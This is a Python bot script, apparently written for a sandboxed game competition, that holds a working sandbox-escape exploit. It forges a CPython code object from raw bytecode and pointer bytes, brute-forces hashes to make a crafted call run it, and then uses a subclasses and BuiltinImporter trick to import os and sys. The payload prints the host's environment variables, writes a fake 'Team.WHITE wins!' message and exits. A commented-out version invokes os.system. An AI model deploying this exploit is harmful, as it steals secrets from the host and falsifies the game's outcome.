# v2: Steal envs
# payload_consts = (None, 0, 'BuiltinImporter', 'os', 'env')
# payload_names = ('get_board_size', '__closure__', 'cell_contents', '__class__', '__bases__', '__subclasses__', '__name__', 'load_module', 'system')
# payload_varnames = ('subs', 'Importer', 'sub', 'imp')
# payload = b't\x00j\x01d\x01\x19\x00j\x02j\x03j\x04d\x01\x19\x00\xa0\x05\xa1\x00}\x00d\x00}\x01x\x1c|\x00D\x00]\x14}\x02|\x02j\x06d\x02k\x02r"|\x02}\x01P\x00q"W\x00|\x01\x83\x00}\x03|\x03\xa0\x07d\x03\xa1\x01\xa0\x08d\x04\xa1\x01\x01\x00d\x00S\x00'
payload_consts = (None, 0, 'BuiltinImporter', 'os', 'sys', '\n', '\n\n\n\nTeam.WHITE wins!\n')
payload_names = ('get_board_size', '__closure__', 'cell_contents', '__class__', '__bases__', '__subclasses__', '__name__', 'load_module', 'stdout', 'write', 'str', 'environ', 'flush', '_exit')
payload_varnames = ('subs', 'Importer', 'sub', 'imp', 'os', 'sys')
payload = b't\x00j\x01d\x01\x19\x00j\x02j\x03j\x04d\x01\x19\x00\xa0\x05\xa1\x00}\x00d\x00}\x01x\x1c|\x00D\x00]\x14}\x02|\x02j\x06d\x02k\x02r"|\x02}\x01P\x00q"W\x00|\x01\x83\x00}\x03|\x03\xa0\x07d\x03\xa1\x01}\x04|\x03\xa0\x07d\x04\xa1\x01}\x05|\x05j\x08\xa0\tt\n|\x04j\x0b\x83\x01d\x05\x17\x00\xa1\x01\x01\x00|\x05j\x08\xa0\td\x06\xa1\x01\x01\x00|\x05j\x08\xa0\x0c\xa1\x00\x01\x00|\x04\xa0\rd\x01\xa1\x01\x01\x00d\x00S\x00'
# v1: Print closure
# payload_consts = (None,)
# payload_names = ('log', 'str', 'get_board_size','__closure__')
# payload = b't\x00t\x01t\x02j\x03\x83\x01\x83\x01d\x00S\x00'
# v0: Hello world
# payload_consts = (None, 'hello world')
# payload_names = ('log',)
# payload = b't\x00d\x01\x83\x01d\x00S\x00'
evil_struct = {
    'code': payload,
    'consts': payload_consts,
    'names': payload_names,
    'varnames': payload_varnames,
    'freevars': (),
    'cellvars': (),
    'filename': '<dummy>',
    'name': 'evil_code',
    'lnotab': str(len(payload)).encode('utf-8') + b'\x00',
    'weakreflist': []
}
all_bytes = [
    b'\x00', b'\x01', b'\x02', b'\x03', b'\x04', b'\x05', b'\x06', b'\x07',
    b'\x08', b'\t', b'\n', b'\x0b', b'\x0c', b'\r', b'\x0e', b'\x0f', b'\x10',
    b'\x11', b'\x12', b'\x13', b'\x14', b'\x15', b'\x16', b'\x17', b'\x18',
    b'\x19', b'\x1a', b'\x1b', b'\x1c', b'\x1d', b'\x1e', b'\x1f', b' ', b'!',
    b'"', b'#', b'$', b'%', b'&', b"'", b'(', b')', b'*', b'+', b',', b'-',
    b'.', b'/', b'0', b'1', b'2', b'3', b'4', b'5', b'6', b'7', b'8', b'9',
    b':', b';', b'<', b'=', b'>', b'?', b'@', b'A', b'B', b'C', b'D', b'E',
    b'F', b'G', b'H', b'I', b'J', b'K', b'L', b'M', b'N', b'O', b'P', b'Q',
    b'R', b'S', b'T', b'U', b'V', b'W', b'X', b'Y', b'Z', b'[', b'\\', b']',
    b'^', b'_', b'`', b'a', b'b', b'c', b'd', b'e', b'f', b'g', b'h', b'i',
    b'j', b'k', b'l', b'm', b'n', b'o', b'p', b'q', b'r', b's', b't', b'u',
    b'v', b'w', b'x', b'y', b'z', b'{', b'|', b'}', b'~', b'\x7f', b'\x80',
    b'\x81', b'\x82', b'\x83', b'\x84', b'\x85', b'\x86', b'\x87', b'\x88',
    b'\x89', b'\x8a', b'\x8b', b'\x8c', b'\x8d', b'\x8e', b'\x8f', b'\x90',
    b'\x91', b'\x92', b'\x93', b'\x94', b'\x95', b'\x96', b'\x97', b'\x98',
    b'\x99', b'\x9a', b'\x9b', b'\x9c', b'\x9d', b'\x9e', b'\x9f', b'\xa0',
    b'\xa1', b'\xa2', b'\xa3', b'\xa4', b'\xa5', b'\xa6', b'\xa7', b'\xa8',
    b'\xa9', b'\xaa', b'\xab', b'\xac', b'\xad', b'\xae', b'\xaf', b'\xb0',
    b'\xb1', b'\xb2', b'\xb3', b'\xb4', b'\xb5', b'\xb6', b'\xb7', b'\xb8',
    b'\xb9', b'\xba', b'\xbb', b'\xbc', b'\xbd', b'\xbe', b'\xbf', b'\xc0',
    b'\xc1', b'\xc2', b'\xc3', b'\xc4', b'\xc5', b'\xc6', b'\xc7', b'\xc8',
    b'\xc9', b'\xca', b'\xcb', b'\xcc', b'\xcd', b'\xce', b'\xcf', b'\xd0',
    b'\xd1', b'\xd2', b'\xd3', b'\xd4', b'\xd5', b'\xd6', b'\xd7', b'\xd8',
    b'\xd9', b'\xda', b'\xdb', b'\xdc', b'\xdd', b'\xde', b'\xdf', b'\xe0',
    b'\xe1', b'\xe2', b'\xe3', b'\xe4', b'\xe5', b'\xe6', b'\xe7', b'\xe8',
    b'\xe9', b'\xea', b'\xeb', b'\xec', b'\xed', b'\xee', b'\xef', b'\xf0',
    b'\xf1', b'\xf2', b'\xf3', b'\xf4', b'\xf5', b'\xf6', b'\xf7', b'\xf8',
    b'\xf9', b'\xfa', b'\xfb', b'\xfc', b'\xfd', b'\xfe', b'\xff']
def pointer_to_bytes(p):
    out = b''
    for i in range(8):
        out = out + all_bytes[p % 256]
        p = p // 256
    return out
def make_payload(cur_round):
    evil_array = (
        b'\x40\x00\x00\x00' + # flags = NOFREE (0x040)
        b'\x9a\x02\x00\x00' + # first line no = 666
        pointer_to_bytes(id(evil_struct['code'])) +
        pointer_to_bytes(id(evil_struct['consts'])) +
        pointer_to_bytes(id(evil_struct['names'])) +
        pointer_to_bytes(id(evil_struct['varnames'])) +
        pointer_to_bytes(id(evil_struct['freevars'])) +
        pointer_to_bytes(id(evil_struct['cellvars'])) +
        pointer_to_bytes(0) + # cell2arg
        pointer_to_bytes(id(evil_struct['filename'])) +
        pointer_to_bytes(id(evil_struct['name'])) +
        pointer_to_bytes(id(evil_struct['lnotab'])) +
        pointer_to_bytes(0) + # zombieframe
        pointer_to_bytes(0) + # weakreflist
        pointer_to_bytes(0) # extra
    )
    UPPER_LIMIT = 2**24
    for i in range(1,2*256):
        test_evil_array = evil_array + all_bytes[i//256] + all_bytes[i%256] + all_bytes[cur_round%256] + b'\x00\x00\x00\x00\x00'
        h = hash(test_evil_array) # cache the hash
        if h < 0:
            h += 2**64
        i1, i2 = h % 2**32, h >> 32
        # log(str(i1) + ' ' + str(i2))
        if i1 < UPPER_LIMIT and i2 < UPPER_LIMIT: break
    if i1 >= UPPER_LIMIT or i2 >= UPPER_LIMIT: return None
    log('Found good hash! '+str(i1)+' '+str(i2))
    evil_array = test_evil_array
    return evil_array

# Call into hacked C struct mimicking PyCodeObject
def call_code(payload, nargs):
    a = True + (True if True or False else False)
    {}
    {}
    {}
    {}
    a = payload + (payload if True or False else False)
    b = b = b = b = b = {}
    {}
    {}
    {}
    {}
    {}
    def evil():
        pass
    evil(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
         0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
         0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
         0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)

has_run = False
cur_round = 0
def turn():
    global has_run, cur_round
    if has_run: return
    evil_array = make_payload(cur_round)
    if evil_array is not None:
        has_run = True
        # import time
        # log('here!')
        # time.sleep(3)
        call_code(evil_array, len(evil_array))
    cur_round += 1
